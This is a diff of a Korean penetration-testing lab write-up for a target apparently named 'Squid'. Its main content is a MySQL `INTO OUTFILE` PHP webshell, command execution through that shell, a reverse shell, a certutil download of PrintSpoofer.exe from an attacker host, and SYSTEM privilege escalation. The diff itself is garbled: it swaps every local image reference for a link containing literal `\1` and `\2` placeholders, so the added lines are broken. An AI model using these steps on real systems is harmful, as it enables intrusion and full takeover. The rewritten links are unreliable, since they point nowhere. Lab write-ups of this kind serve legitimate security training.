@@ -320,10 +320,10 @@ for port in $(cat /tmp/ports_to_check.txt) ; do \
 done
 ```
 
-![](image_20.png)
+![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 
 - 8080 port found!
-  ![8080 found](image_19.png)
+  ![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 - phpmyadmin path found
 
 ## 5. 내부 웹
@@ -817,11 +817,11 @@ $(function() {
 ## 6. Hydra
 
 - phpinfo() button
-  ![phpinfo()](image_22.png)
+  ![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 - fopen On
-  ![fopen](image_21.png)
+  ![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 - server root fs
-- ![root fs](image_25.png)
+- ![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 
 ```bash
 hydra -l root -P /usr/share/wordlists/...  (명령어 잘림, 원본 미확인)
@@ -1052,7 +1052,7 @@ phpMyAdmin은 로그인 시 세션+CSRF 토큰 검증을 하므로 Hydra처럼 �
 - MYSQL webshell output write
   ![web_shell_output](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_6.png)
 
-- ![fs pwd](image_26.png)
+- ![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 
 ```sql
 SELECT '<?php system($_GET["cm-d"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
@@ -1060,12 +1060,12 @@ SELECT '<?php system($_GET["cm-d"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
 
 - 현재 웹 서비스가 wamp에서 진행된다고 가정하고 /wamp/www/ 경로에 생성 -> 일반적으로 wamp는 C:/wamp/www/ 을 사용하기 때문에 시도하기
 - nt authority\local service
-  ![](image_17.png)
+  ![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 - 그냥 C:/shell.php 도 실행이 되는데?
 
 http://192.168.150.189:8080/shell.php?cmd=whoami
 
-![](image_18.png)
+![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 ![output](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_7.png)
 
 nt authority\local service
@@ -1156,18 +1156,18 @@ INTO OUTFILE 'C:/wamp/www/uploader.php';
 
 ./tmp/php_shell.php
 
-![php reverse shell](image_27.png)
+![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 
 # reverse success
 
-![reverse success](image_28.png)
-![](image_29.png)
+![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 
 # local flag
 
-![](image_30.png)
+![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 
-![](image_31.png)
+![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 
 # LHOST
 
@@ -1178,9 +1178,9 @@ sudo wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoo
 mkdir C:\Temp
 
 certutil -urlcache -f http://192.168.49.150/PrintSpoofer.exe C:\Temp\PrintSpoofer.exe
-![](image_33.png)
+![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 
-![](image_34.png)
+![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
 
 # privilege escalation
 
@@ -1188,8 +1188,12 @@ certutil -urlcache -f http://192.168.49.150/PrintSpoofer.exe C:\Temp\PrintSpoofe
 PrintSpoofer.exe -i -c cmd.exe
 ```
 
-![](image_35.png)
+![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+
+```cmd
+dir /s *검색어*
+```
 
 # proof.txt
 
-![](image_36.png)
+![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
